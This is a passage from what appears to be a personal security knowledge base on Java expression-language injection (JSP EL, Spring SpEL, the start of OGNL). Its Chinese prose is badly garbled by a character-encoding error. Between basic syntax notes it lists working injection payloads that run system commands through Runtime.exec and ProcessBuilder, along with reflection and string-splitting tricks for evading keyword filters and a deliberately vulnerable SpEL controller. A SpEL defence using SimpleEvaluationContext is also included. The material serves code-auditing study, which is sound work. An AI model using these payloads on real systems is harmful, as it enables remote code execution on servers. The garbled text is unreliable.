ä¾‹å¦‚ï¼Œ${userinfo}ä»£è¡¨è·å–å˜é‡userinfoçš„å€¼ã€‚å½“ELè¡¨è¾¾å¼ä¸­çš„å˜é‡ä¸ç»™å®šèŒƒå›´æ—¶ï¼Œåˆ™é»˜è®¤åœ¨pageèŒƒå›´æŸ¥æ‰¾ï¼Œç„¶åä¾æ¬¡åœ¨requestã€sessionã€applicationèŒƒå›´æŸ¥æ‰¾ã€‚ä¹Ÿå¯ä»¥ç”¨èŒƒå›´ä½œä¸ºå‰ç¼€è¡¨ç¤ºå±äºå“ªä¸ªèŒƒå›´çš„å˜é‡ï¼Œä¾‹å¦‚ï¼š${pageScope.userinfo}è¡¨ç¤ºè®¿é—®pageèŒƒå›´ä¸­çš„userinfoå˜é‡ã€‚ ç®€å•åœ°è¯´ï¼Œä½¿ç”¨ELè¡¨è¾¾å¼è¯­æ³•ï¼š${ELè¡¨è¾¾å¼} å…¶ä¸­ï¼ŒELè¡¨è¾¾å¼å’ŒJSPä»£ç ç­‰ä»·è½¬æ¢ã€‚äº‹å®ä¸Šï¼Œå¯ä»¥å°†ELè¡¨è¾¾å¼ç†è§£ä¸ºä¸€ç§ç®€åŒ–çš„JSPä»£ç ã€‚ æ‰©å±•JSPä»£ç çš„å†™æ³•æ€»ç»“ï¼š JSPè¡¨è¾¾å¼ï¼š å‘æµè§ˆå™¨è¾“å‡ºå˜é‡æˆ–è¡¨è¾¾å¼çš„è®¡ç®—ç»“æœã€‚ JSPè„šæœ¬ï¼š æ‰§è¡Œjavaä»£ç çš„åŸç†ï¼šç¿»è¯‘åˆ°_jspService()æ–¹æ³•ä¸­ã€‚ JSPå£°æ˜ï¼š å£°æ˜jspçš„æˆå‘˜å˜é‡æˆ–æˆå‘˜æ–¹æ³•ã€‚ JSPæ³¨é‡Šï¼š ç”¨äºæ³¨é‡ŠJSPä»£ç ï¼Œä¸ä¼šç¿»è¯‘åˆ°Javaæ–‡ä»¶ä¸­ï¼Œä¹Ÿä¸ä¼šæ‰§è¡Œã€‚ [ ]ä¸.è¿ç®—ç¬¦ ELè¡¨è¾¾å¼æä¾›.å’Œ[]ä¸¤ç§è¿ç®—ç¬¦æ¥å­˜å–æ•°æ®ã€‚ å½“è¦å­˜å–çš„å±æ€§åç§°ä¸­åŒ…å«ä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œå¦‚.æˆ–-ç­‰å¹¶éå­—æ¯æˆ–æ•°å­—çš„ç¬¦å·ï¼Œå°±ä¸€å®šè¦ä½¿ç”¨[]ã€‚ä¾‹å¦‚ï¼š${user.My-Name}åº”å½“æ”¹ä¸º${user[\"My-Name\"]}ã€‚ å¦‚æœè¦åŠ¨æ€å–å€¼æ—¶ï¼Œå°±å¯ä»¥ç”¨[]æ¥åšï¼Œè€Œ.æ— æ³•åšåˆ°åŠ¨æ€å–å€¼ã€‚ä¾‹å¦‚ï¼š${sessionScope.user[data]}ä¸­data æ˜¯ä¸€ä¸ªå˜é‡ã€‚ è·å–å˜é‡ä¸¾ä¾‹ map = new HashMap<>(); map.put(\"my-name\", \"admin\"); request.setAttribute(\"test\", map); %> ä»å››ä¸ªä½œç”¨åŸŸä¸­æœç´¢å˜é‡ï¼š${name} ä»requestScopeä½œç”¨åŸŸä¸­è·å–å˜é‡ï¼š${requestScope.request} ä»sessionScopeä½œç”¨åŸŸä¸­è·å–å˜é‡ï¼š${sessionScope.session} ä»pageScopeä½œç”¨åŸŸä¸­è·å–å˜é‡ï¼š${pageScope.page} ä»applicationScopeä½œç”¨åŸŸä¸­è·å–å˜é‡ï¼š${applicationScope.application} ä»ä½œç”¨åŸŸä¸­è·å–ç‰¹æ®Šç¬¦å·å˜é‡ï¼š${requestScope.test[\"my-name\"]} æ“ä½œç¬¦ ç±»å‹ ç¬¦å· ç®—æœ¯å‹ +ã€-ï¼ˆäºŒå…ƒï¼‰ã€*ã€/ã€divã€%ã€modã€-ï¼ˆä¸€å…ƒï¼‰ é€»è¾‘å‹ andã€&&ã€orã€\\ \\ ã€!ã€not å…³ç³»å‹ ==ã€eqã€!=ã€neã€ã€gtã€=ã€geã€‚å¯ä»¥ä¸å…¶ä»–å€¼è¿›è¡Œæ¯”è¾ƒï¼Œæˆ–ä¸å¸ƒå°”å‹ã€å­—ç¬¦ä¸²å‹ã€æ•´å‹æˆ–æµ®ç‚¹å‹æ–‡å­—è¿›è¡Œæ¯”è¾ƒã€‚ ç©º empty ç©ºæ“ä½œç¬¦æ˜¯å‰ç¼€æ“ä½œï¼Œå¯ç”¨äºç¡®å®šå€¼æ˜¯å¦ä¸ºç©ºã€‚ æ¡ä»¶å‹ A ?B :C ã€‚æ ¹æ® A èµ‹å€¼çš„ç»“æœæ¥èµ‹å€¼ B æˆ– Cã€‚ è¿ç®—ç¬¦ä¼˜å…ˆçº§å¦‚ä¸‹ï¼ˆä»é«˜åˆ°ä½ï¼Œä»å·¦åˆ°å³ï¼‰ï¼š [] . () (ç”¨äºæ›´æ”¹è¿ç®—ç¬¦çš„ä¼˜å…ˆ) - (ä¸€å…ƒ) not ! empty * / div % mod + - (äºŒå…ƒ) += <> = lt gt le ge == != eq ne && and || or ? : -> = ; éšå«å¯¹è±¡ ELè¡¨è¾¾å¼è¯­è¨€ä¸­å®šä¹‰äº†11ä¸ªéšå«å¯¹è±¡ï¼Œä½¿ç”¨è¿™äº›éšå«å¯¹è±¡å¯ä»¥å¾ˆæ–¹ä¾¿åœ°è·å–webå¼€å‘ä¸­çš„ä¸€äº›å¸¸è§å¯¹è±¡ï¼Œå¹¶è¯»å–è¿™äº›å¯¹è±¡çš„æ•°æ®ã€‚ è¯­æ³•ï¼š${éšå¼å¯¹è±¡åç§°}ï¼šè·å¾—å¯¹è±¡çš„å¼•ç”¨ åºå· éšå«å¯¹è±¡åç§° æ è¿° 1 pageContext å¯¹åº”äºJSPé¡µé¢ä¸­çš„pageContextå¯¹è±¡ï¼ˆæ³¨æ„ï¼šå–çš„æ˜¯pageContextå¯¹è±¡ã€‚ï¼‰ 2 pageScope ä»£è¡¨pageåŸŸä¸­ç”¨äºä¿å­˜å±æ€§çš„Mapå¯¹è±¡ 3 requestScope ä»£è¡¨requeståŸŸä¸­ç”¨äºä¿å­˜å±æ€§çš„Mapå¯¹è±¡ 4 sessionScope ä»£è¡¨sessionåŸŸä¸­ç”¨äºä¿å­˜å±æ€§çš„Mapå¯¹è±¡ 5 applicationScope ä»£è¡¨applicationåŸŸä¸­ç”¨äºä¿å­˜å±æ€§çš„Mapå¯¹è±¡ 6 param è¡¨ç¤ºä¸€ä¸ªä¿å­˜äº†æ‰€æœ‰è¯·æ±‚å‚æ•°çš„Mapå¯¹è±¡ 7 paramValues è¡¨ç¤ºä¸€ä¸ªä¿å­˜äº†æ‰€æœ‰è¯·æ±‚å‚æ•°çš„Mapå¯¹è±¡ï¼Œå®ƒå¯¹äºæŸä¸ªè¯·æ±‚å‚æ•°ï¼Œè¿”å›çš„æ˜¯ä¸€ä¸ªstring[] 8 header è¡¨ç¤ºä¸€ä¸ªä¿å­˜äº†æ‰€æœ‰httpè¯·æ±‚å¤´å­—æ®µçš„Mapå¯¹è±¡ï¼Œæ³¨æ„ï¼šå¦‚æœå¤´é‡Œé¢æœ‰â€œ-â€ ï¼Œä¾‹Accept-Encodingï¼Œåˆ™è¦header[â€œAccept-Encodingâ€] 9 headerValues è¡¨ç¤ºä¸€ä¸ªä¿å­˜äº†æ‰€æœ‰httpè¯·æ±‚å¤´å­—æ®µçš„Mapå¯¹è±¡ï¼Œå®ƒå¯¹äºæŸä¸ªè¯·æ±‚å‚æ•°ï¼Œè¿”å›çš„æ˜¯ä¸€ä¸ªstring[]æ•°ç»„ã€‚æ³¨æ„ï¼šå¦‚æœå¤´é‡Œé¢æœ‰â€œ-â€ ï¼Œä¾‹Accept-Encodingï¼Œåˆ™è¦headerValues[â€œAccept-Encodingâ€] 10 cookie è¡¨ç¤ºä¸€ä¸ªä¿å­˜äº†æ‰€æœ‰cookieçš„Mapå¯¹è±¡ 11 initParam è¡¨ç¤ºä¸€ä¸ªä¿å­˜äº†æ‰€æœ‰webåº”ç”¨åˆå§‹åŒ–å‚æ•°çš„mapå¯¹è±¡ å‡½æ•° ELè¡¨è¾¾å¼è¯­æ³•å…è®¸å¼€å‘äººå‘˜å¼€å‘è‡ªå®šä¹‰å‡½æ•°ï¼Œä»¥è°ƒç”¨Javaç±»çš„æ–¹æ³•ã€‚è¯­æ³•ï¼š${prefixï¼šmethod(params)} åœ¨ELè¡¨è¾¾å¼ä¸­è°ƒç”¨çš„åªèƒ½æ˜¯Javaç±»çš„é™æ€æ–¹æ³•ï¼Œè¿™ä¸ªJavaç±»çš„é™æ€æ–¹æ³•éœ€è¦åœ¨TLDæ–‡ä»¶ä¸­æè¿°ï¼Œæ‰å¯ä»¥è¢«ELè¡¨è¾¾å¼è°ƒç”¨ã€‚ ELè‡ªå®šä¹‰å‡½æ•°ç”¨äºæ‰©å±•ELè¡¨è¾¾å¼çš„åŠŸèƒ½ï¼Œå¯ä»¥è®©ELè¡¨è¾¾å¼å®Œæˆæ™®é€šJavaç¨‹åºä»£ç æ‰€èƒ½å®Œæˆçš„åŠŸèƒ½ã€‚ ä¸¾ä¾‹ï¼š ==>ç¼–å†™ä¸€ä¸ªè®©æ‰€æœ‰å­—ç¬¦å¤§å†™çš„å‡½æ•° ä¸€èˆ¬æ¥è¯´ï¼Œ ELè‡ªå®šä¹‰å‡½æ•°å¼€å‘ä¸åº”ç”¨åŒ…æ‹¬ä»¥ä¸‹ä¸‰ä¸ªæ­¥éª¤ï¼š 1ã€ç¼–å†™ä¸€ä¸ªJavaç±»çš„é™æ€æ–¹æ³• 2ã€ç¼–å†™æ ‡ç­¾åº“æè¿°ç¬¦ï¼ˆtldï¼‰æ–‡ä»¶ï¼Œåœ¨tldæ–‡ä»¶ä¸­æè¿°è‡ªå®šä¹‰å‡½æ•°ã€‚ 3ã€åœ¨JSPé¡µé¢ä¸­å¯¼å…¥å’Œä½¿ç”¨è‡ªå®šä¹‰å‡½æ•° 1ã€ç¼–å†™ä¸€ä¸ªJavaç±»çš„é™æ€æ–¹æ³•ï¼Œä»£ç å¦‚ä¸‹ public class ELFunc { public static String up(String message) { if (message == null){ return null; } return message.toUpperCase(); } } 2ã€ç¼–å†™æ ‡ç­¾åº“æè¿°ç¬¦ï¼ˆtldï¼‰æ–‡ä»¶ï¼Œåœ¨tldæ–‡ä»¶ä¸­æè¿°è‡ªå®šä¹‰å‡½æ•°ã€‚ ELFunc.tldä½ç½® ä»£ç  1.0 ELFunc --> /ELFunc å­å…ƒç´ ç”¨äºæŒ‡å®šELè‡ªå®šä¹‰å‡½æ•°çš„åç§°--> up å­å…ƒç´ ç”¨äºæŒ‡å®šå®Œæ•´çš„Javaç±»å--> ELFunc å­å…ƒç´ ç”¨äºæŒ‡å®šJavaç±»ä¸­çš„é™æ€æ–¹æ³•çš„ç­¾åï¼Œ 20 æ–¹æ³•ç­¾åå¿…é¡»æŒ‡æ˜æ–¹æ³•çš„è¿”å›å€¼ç±»å‹åŠå„ä¸ªå‚æ•°çš„ç±»å‹ï¼Œå„ä¸ªå‚æ•°ä¹‹é—´ç”¨é€—å·åˆ†éš”ã€‚--> java.lang.String up(java.lang.String) 3ã€åœ¨JSPé¡µé¢ä¸­å¯¼å…¥å’Œä½¿ç”¨è‡ªå®šä¹‰å‡½æ•° ${fn:up(\"123aaabbbCCC\")} å®éªŒäº†å¥½ä¹…ä»£ç åº”è¯¥æ˜¯æ²¡é—®é¢˜çš„ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰æŠ¥é”™ï¼Œåé¢éœ€è¦å†è§£å†³è¿™ä¸ªé—®é¢˜å§ï¼Œä»Šå¤©æ˜¯è§£å†³ä¸äº†äº†ï¼Œä¸ç„¶ä¸€å¤©æ²¡äº†ã€‚ã€‚ã€‚ ç¦ç”¨/å¯ç”¨ELè¡¨è¾¾å¼ å…¨å±€ç¦ç”¨ELè¡¨è¾¾å¼ï¼Œweb.xmlä¸­è¿›å…¥å¦‚ä¸‹é…ç½®ï¼š *.jsp true å•ä¸ªæ–‡ä»¶ç¦ç”¨ELè¡¨è¾¾å¼ åœ¨JSPæ–‡ä»¶ä¸­å¯ä»¥æœ‰å¦‚ä¸‹å®šä¹‰ï¼š è¯¥è¯­å¥è¡¨ç¤ºæ˜¯å¦ç¦ç”¨ELè¡¨è¾¾å¼ï¼ŒTRUEè¡¨ç¤ºç¦æ­¢ï¼ŒFALSEè¡¨ç¤ºä¸ç¦æ­¢ã€‚ JSP2.0ä¸­é»˜è®¤çš„å¯ç”¨ELè¡¨è¾¾å¼ã€‚ ELè¡¨è¾¾å¼æ³¨å…¥ åŸç†éƒ½æ˜¯ä¸€æ ·çš„ï¼šè¡¨è¾¾å¼å…¨éƒ¨æˆ–éƒ¨ä»½å¤–éƒ¨å¯æ§ã€‚åˆ—ä¸€äº›é€šç”¨çš„poc //å¯¹åº”äºJSPé¡µé¢ä¸­çš„pageContextå¯¹è±¡ï¼ˆæ³¨æ„ï¼šå–çš„æ˜¯pageContextå¯¹è±¡ï¼‰ ${pageContext} //è·å–Webè·¯å¾„ ${pageContext.getSession().getServletContext().getClassLoader().getResource(\"\")} //æ–‡ä»¶å¤´å‚æ•° ${header} //è·å–webRoot ${applicationScope} //æ‰§è¡Œå‘½ä»¤ ${pageContext.request.getSession().setAttribute(\"a\",pageContext.request.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"calc\").getInputStream())} ELè¡¨è¾¾å¼æ³¨å…¥ç»•è¿‡ é€šè¿‡ charAt ä¸ toChars è·å–å­—ç¬¦ï¼Œåœ¨ç”± toString è½¬å­—ç¬¦ä¸²å†ç”¨ concat æ‹¼æ¥æ¥ç»•è¿‡ä¸€äº›æ•æ„Ÿå­—ç¬¦çš„è¿‡æ»¤ ${\"xxx\".toString().charAt(0).toChars(97)[0].toString()} ${\"xxx\".toString().charAt(0).toChars(97)[0].toString().concat(\"xxx\".toString().charAt(0).toChars(98)[0].toString())} é€šè¿‡ä»¥ä¸Šä»£ç ï¼Œåªéœ€è¦ä¿®æ”¹toChars()ä¸­çš„asciiç å€¼å°±å¯ä»¥å˜æˆä»»æ„å­—ç¬¦ å‚è€ƒ javawebå­¦ä¹ æ€»ç»“(äºŒåä¹)â€”â€”ELè¡¨è¾¾å¼ æµ…æELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ ï¼ˆå¾ˆè¯¦ç»†ï¼‰ Java EL ï¼ˆExpression Languageï¼‰è¡¨è¾¾å¼æ³¨å…¥ Copyright Â© d4m1ts 2022 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2021-12-25 18:51:59 "},"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/10.SpELè¡¨è¾¾å¼.html":{"url":"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/10.SpELè¡¨è¾¾å¼.html","title":"10.SpELè¡¨è¾¾å¼","keywords":"","body":"TreeviewCopyright Â© d4m1ts all right reserved, powered by aleen42 ä»‹ç» åŸºç¡€ä½¿ç”¨ pom.xml åŸºç¡€ä¾‹å­ SpELè¯­æ³• SpELè¡¨è¾¾å¼åˆ†ç±» åŸºæœ¬è¡¨è¾¾å¼ ç±»ç›¸å…³è¡¨è¾¾å¼ é›†åˆç›¸å…³è¡¨è¾¾å¼ å…¶ä»–è¡¨è¾¾å¼ SpELç±»ç›¸å…³è¡¨è¾¾å¼â€¼ï¸ ç±»ç±»å‹è¡¨è¾¾å¼ ç±»å®ä¾‹åŒ– instanceof è¡¨è¾¾å¼ å¸¸ç”¨payload ç»•è¿‡æ–¹å¼ é˜²å¾¡ å‚è€ƒ ä»‹ç» Spring Expression Languageï¼ˆç®€ç§°SpELï¼‰æ˜¯ä¸€ç§å¼ºå¤§çš„è¡¨è¾¾å¼è¯­è¨€ï¼Œæ”¯æŒåœ¨è¿è¡Œæ—¶æŸ¥è¯¢å’Œæ“ä½œå¯¹è±¡å›¾ã€‚è¯­è¨€è¯­æ³•ç±»ä¼¼äºUnified ELï¼Œä½†æä¾›äº†é¢å¤–çš„åŠŸèƒ½ï¼Œç‰¹åˆ«æ˜¯æ–¹æ³•è°ƒç”¨å’ŒåŸºæœ¬çš„å­—ç¬¦ä¸²æ¨¡æ¿åŠŸèƒ½ã€‚åŒæ—¶å› ä¸ºSpELæ˜¯ä»¥APIæ¥å£çš„å½¢å¼åˆ›å»ºçš„ï¼Œæ‰€ä»¥å…è®¸å°†å…¶é›†æˆåˆ°å…¶ä»–åº”ç”¨ç¨‹åºå’Œæ¡†æ¶ä¸­ã€‚ SpELçš„è¯ç”Ÿæ˜¯ä¸ºäº†ç»™ Spring ç¤¾åŒºæä¾›ä¸€ç§èƒ½å¤Ÿä¸ Spring ç”Ÿæ€ç³»ç»Ÿæ‰€æœ‰äº§å“æ— ç¼å¯¹æ¥ï¼Œèƒ½æä¾›ä¸€ç«™å¼æ”¯æŒçš„è¡¨è¾¾å¼è¯­è¨€ã€‚ Springæ¡†æ¶çš„æ ¸å¿ƒåŠŸèƒ½ä¹‹ä¸€å°±æ˜¯é€šè¿‡ä¾èµ–æ³¨å…¥çš„æ–¹å¼æ¥ç®¡ç†Beanä¹‹é—´çš„ä¾èµ–å…³ç³»ï¼Œè€ŒSpElå¯ä»¥æ–¹ä¾¿å¿«æ·çš„å¯¹ApplicationContextä¸­çš„Beanè¿›è¡Œå±æ€§çš„è£…é…å’Œæå–ã€‚ åŸºç¡€ä½¿ç”¨ å…ˆæ–°å»ºä¸€ä¸ªSpringé¡¹ç›® pom.xml org.springframework spring-expression 5.2.12.RELEASE åŸºç¡€ä¾‹å­ ä¸€ä¸ªç®€å•çš„Controller messageä¸ºgetä¼ å…¥çš„å‚æ•° ExpressionParseræ¥å£è´Ÿè´£è§£æè¡¨è¾¾å¼å­—ç¬¦ä¸² getValueæ–¹æ³•æ‰§è¡Œè¡¨è¾¾å¼å¹¶è¿”å›ç»“æœ é»˜è®¤å®¹å™¨æ˜¯springæœ¬èº«çš„å®¹å™¨ï¼šApplicationContext package com.spel.test.demo; import org.springframework.expression.Expression; import org.springframework.expression.ExpressionParser; import org.springframework.expression.spel.standard.SpelExpressionParser; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RestController; @RestController public class HelloController { @GetMapping(\"/test\") public String catUser(String message) { ExpressionParser parser = new SpelExpressionParser(); Expression expression = parser.parseExpression(message); return expression.getValue().toString(); } } è®¿é—® http://127.0.0.1:8080/test?message=T(java.lang.Math).random()*100ï¼Œå¯è§æˆåŠŸå¾—åˆ°ä¸€ä¸ªéšæœºæ•°ï¼Œè¯´æ˜è¡¨è¾¾å¼è¢«æ‰§è¡Œäº† è®¿é—® http://127.0.0.1:8080/test?message=new%20java.lang.ProcessBuilder(%22whoami%22).start() å¯ä»¥ç›´æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ SpELè¯­æ³• SpELä½¿ç”¨ #{...} ä½œä¸ºå®šç•Œç¬¦ï¼Œæ‰€æœ‰åœ¨å¤§æ‹¬å·ä¸­çš„å­—ç¬¦éƒ½å°†è¢«è®¤ä¸ºæ˜¯ SpELè¡¨è¾¾å¼ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å…¶ä¸­ä½¿ç”¨è¿ç®—ç¬¦ï¼Œå˜é‡ä»¥åŠå¼•ç”¨beanï¼Œå±æ€§å’Œæ–¹æ³•å¦‚ï¼š å¼•ç”¨å…¶ä»–å¯¹è±¡:#{car} å¼•ç”¨å…¶ä»–å¯¹è±¡çš„å±æ€§ï¼š#{car.brand} è°ƒç”¨å…¶å®ƒæ–¹æ³• , è¿˜å¯ä»¥é“¾å¼æ“ä½œï¼š#{car.toString()} å…¶ä¸­å±æ€§åç§°å¼•ç”¨è¿˜å¯ä»¥ç”¨$ç¬¦å· å¦‚ï¼š${someProperty} é™¤æ­¤ä»¥å¤–åœ¨SpELä¸­ï¼Œä½¿ç”¨T()è¿ç®—ç¬¦ä¼šè°ƒç”¨ç±»ä½œç”¨åŸŸçš„æ–¹æ³•å’Œå¸¸é‡ã€‚ä¾‹å¦‚ï¼Œåœ¨SpELä¸­ä½¿ç”¨Javaçš„Mathç±»ï¼Œæˆ‘ä»¬å¯ä»¥åƒä¸‹é¢çš„ç¤ºä¾‹è¿™æ ·ä½¿ç”¨T()è¿ç®—ç¬¦ï¼š #{T(java.lang.Math)} æ¼”ç¤ºå› ä¸ºæ˜¯æœ¬åœ°ç¯å¢ƒï¼Œä¸”æ˜¯å°†è¾“å…¥çš„å‚æ•°ç›´æ¥å½“æˆSpELè¡¨è¾¾å¼å»æ‰§è¡Œçš„ï¼Œæ‰€ä»¥æ²¡æœ‰è¾“å…¥#{}ï¼Œä½†æ˜¯å¦‚æœç”¨@Valueå»è·å–å€¼æ‰§è¡Œå°±éœ€è¦äº† @Value(\"#{ T(java.lang.Math).random() * 100.0 }\") private int rand; SpELè¡¨è¾¾å¼åˆ†ç±» åŸºæœ¬è¡¨è¾¾å¼ å­—é¢é‡è¡¨è¾¾å¼ã€å…³ç³»ï¼Œé€»è¾‘ä¸ç®—æ•°è¿ç®—è¡¨è¾¾å¼ã€å­—ç¬¦ä¸²é“¾æ¥åŠæˆªå–è¡¨è¾¾å¼ã€ä¸‰ç›®è¿ç®—ã€æ­£åˆ™è¡¨è¾¾å¼ä»¥åŠæ‹¬å·ä¼˜å…ˆçº§è¡¨è¾¾å¼ï¼› ç±»ç›¸å…³è¡¨è¾¾å¼ ç±»ç±»å‹è¡¨è¾¾å¼ã€ç±»å®ä¾‹åŒ–ã€instanceof è¡¨è¾¾å¼ã€å˜é‡å®šä¹‰åŠå¼•ç”¨ã€èµ‹å€¼è¡¨è¾¾å¼ã€è‡ªå®šä¹‰å‡½æ•°ã€å¯¹è±¡å±æ€§å­˜å–åŠå®‰å…¨å¯¼èˆªè¡¨è¾¾å¼ã€å¯¹è±¡æ–¹æ³•è°ƒç”¨ã€Bean å¼•ç”¨ï¼› é›†åˆç›¸å…³è¡¨è¾¾å¼ å†…è” Listã€å†…è”æ•°ç»„ã€é›†åˆã€å­—å…¸è®¿é—®ã€åˆ—è¡¨ã€å­—å…¸ï¼› å…¶ä»–è¡¨è¾¾å¼ æ¨¡ç‰ˆè¡¨è¾¾å¼ SpELç±»ç›¸å…³è¡¨è¾¾å¼â€¼ï¸ ç±»ç±»å‹è¡¨è¾¾å¼ ä½¿ç”¨\"T(Type)\"æ¥è¡¨ç¤º java.lang.Class å®ä¾‹ï¼Œ\"Type\"å¿…é¡»æ˜¯ç±»å…¨é™å®šåï¼Œ\"java.lang\"åŒ…é™¤å¤–ï¼Œå³è¯¥åŒ…ä¸‹çš„ç±»å¯ä»¥ä¸æŒ‡å®šåŒ…åï¼›ä½¿ç”¨ç±»ç±»å‹è¡¨è¾¾å¼è¿˜å¯ä»¥è¿›è¡Œè®¿é—®ç±»é™æ€æ–¹æ³•åŠç±»é™æ€å­—æ®µã€‚ ä¸¾ä¾‹ // java.lang åŒ…ç±»è®¿é—® T(String) // å…¶ä»–åŒ…ç±»è®¿é—® T(java.lang.Runtime).getRuntime().exec('open -na Calculator') //ç±»é™æ€å­—æ®µè®¿é—® T(Integer).MAX_VALUE //ç±»é™æ€æ–¹æ³•è°ƒç”¨ T(Integer).parseInt('1') ç±»å®ä¾‹åŒ– ç±»å®ä¾‹åŒ–åŒæ ·ä½¿ç”¨ java å…³é”®å­—ã€Œnewã€ï¼Œç±»åå¿…é¡»æ˜¯å…¨é™å®šåï¼Œä½† java.lang åŒ…å†…çš„ç±»å‹é™¤å¤–ï¼Œå¦‚ Stringã€Integerã€‚ new java.util.Date() instanceof è¡¨è¾¾å¼ SpEL æ”¯æŒ instanceof è¿ç®—ç¬¦ï¼Œè·Ÿ Java å†…ä½¿ç”¨åŒä¹‰ \"test\" instanceof T(String) å¸¸ç”¨payload ${12*12} T(java.lang.Runtime).getRuntime().exec(\"open -na Calculator\") T(Thread).sleep(10000) #this.getClass().forName('java.lang.Runtime').getRuntime().exec('open -na Calculator') new java.lang.ProcessBuilder('open -na Calculator').start() å›æ˜¾ å¼•å…¥äº†org.apache.commons.ioè¿™ä¸ªåŒ…çš„è¯ï¼Œå¯ä»¥è¾“å‡ºå›æ˜¾ T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(\"whoami\").getInputStream()) ç»•è¿‡æ–¹å¼ å¦‚æœé‡‡ç”¨å…³é”®è¯è¿‡æ»¤ï¼Œå¯ä»¥é‡‡ç”¨åå°„çš„æ–¹å¼æ¥ç»•è¿‡ T(String).class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"open%20-na%20Calculator\") // + ä¸€å®šè¦ç”¨urlç¼–ç ï¼Œä¸ç„¶æµè§ˆå™¨è§£æä¼šæœ‰é—®é¢˜ T(String).class.forName(\"java.lang.Ru\"%2b\"ntime\").getMethod(\"getRu\"%2b\"ntime\").invoke(null).exec(\"open%20-na%20Calculator\") T(String).getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).getClass().getMethod(\"exec\",T(String)).invoke(T(java.lang.Runtime).getRuntime(),\"open%20-na%20Calculator\") ä½¿ç”¨ScriptEngineManageræ„é€  T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"nashorn\").eval(\"java.lang.Runtime.getRuntime().exec('open -na Calculator')\") T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"nashorn\").eval(\"java.lang.Runt\"%2b\"ime.getRu\"%2b\"ntime().e\"%2b\"xec('open -na Calculator')\") å¦‚æœä¸èƒ½ä½¿ç”¨åŒå¼•å·ï¼Œé‚£ä¹ˆå¯ä»¥é‡‡ç”¨ç”Ÿæˆä»»æ„å­—ç¬¦+concatå‡½æ•°çš„å½¢å¼è¿›è¡Œç»•è¿‡ T(java.lang.Character).toString(97).concat(T(java.lang.Character).toString(98)) é˜²å¾¡ å› ä¸ºSpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´å¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡è¡¨è¾¾å¼æ‰§è¡Œç²¾å¿ƒæ„é€ çš„ä»»æ„ä»£ç ï¼Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚ä¸ºäº†é˜²å¾¡è¯¥ç±»æ¼æ´ï¼ŒSpringå®˜æ–¹æ¨å‡ºäº†SimpleEvaluationContextä½œä¸ºå®‰å…¨ç±»æ¥é˜²å¾¡è¯¥ç±»æ¼æ´ã€‚ å®˜æ–¹æ–‡æ¡£ï¼šhttps://docs.spring.io/spring/docs/5.0.6.RELEASE/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html SimpleEvaluationContext æ—¨åœ¨ä»…æ”¯æŒ SpEL è¯­è¨€è¯­æ³•çš„ä¸€ä¸ªå­é›†ã€‚å®ƒä¸åŒ…æ‹¬ Java ç±»å‹å¼•ç”¨ï¼Œæ„é€ å‡½æ•°å’Œ bean å¼•ç”¨ï¼›æ‰€ä»¥æœ€ç›´æ¥çš„ä¿®å¤æ–¹å¼æ˜¯ä½¿ç”¨ SimpleEvaluationContextâ€‰æ›¿æ¢ StandardEvaluationContextã€‚ åŸºç¡€ä¸¾ä¾‹ ExpressionParser parser = new SpelExpressionParser(); Expression expression = parser.parseExpression(message); EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().withRootObject(message).build(); return expression.getValue(context).toString(); å‚è€ƒ Javaä»£ç å®¡è®¡ä¹‹SpELè¡¨è¾¾å¼æ³¨å…¥ ç”±æµ…å…¥æ·±SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ Copyright Â© d4m1ts 2022 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2021-12-25 18:51:59 "},"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/11.OGNLè¡¨è¾¾å¼.html":{"url":"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/11.OGNLè¡¨è¾¾å¼.html","title":"11.OGNLè¡¨è¾¾å¼","keywords":"","body":"TreeviewCopyright Â© d4m1ts all right reserved, powered by aleen42 ä»‹ç» ä¸‰è¦ç´  ä½¿ç”¨OGNLè¡¨è¾¾å¼ pom.xml åŸºç¡€ç”¨æ³•ä¸¾ä¾‹ å¯¹Rootå¯¹è±¡çš„è®¿é—® å¯¹ä¸Šä¸‹æ–‡å¯¹è±¡çš„è®¿é—® å¯¹é™æ€å˜é‡çš„è®¿é—®â€¼ï¸ æ–¹æ³•çš„è°ƒç”¨â€¼ï¸ å¯¹æ•°ç»„å’Œé›†åˆçš„è®¿é—® æŠ•å½±ä¸é€‰æ‹© åˆ›å»ºå¯¹è±¡â€¼ï¸ å’Œ % å’Œ $ çš„åŒºåˆ« #ç¬¦ %ç¬¦ $ç¬¦ å’Œ . å’Œ @ çš„åŒºåˆ« OGNLè¡¨è¾¾å¼æ³¨å…¥ æ³¨å…¥ä¸¾ä¾‹ èƒ½è§£æOGNLçš„API HTTPè¯·æ±‚ä¸­å¸¸è§çš„æ³¨å…¥ç‚¹ å¸¸ç”¨payload å‚è€ƒ ä»‹ç» OGNL æ˜¯ Object-Graph Navigation 